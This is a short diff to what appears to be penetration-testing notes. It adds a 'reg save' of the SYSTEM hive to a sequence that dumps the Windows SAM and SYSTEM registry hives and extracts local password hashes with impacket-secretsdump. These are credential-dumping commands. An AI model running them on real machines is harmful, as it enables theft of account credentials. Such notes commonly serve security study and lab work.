@@ -1442,6 +1442,8 @@ mkdir C:\Temp
 reg save HKLM\SAM C:\Temp\SAM
 reg save HKLM\SYSTEM C:\Temp\SYSTEM
 
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv /y
+
 impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
 #Now a detailed list of hashes are displayed
 ```
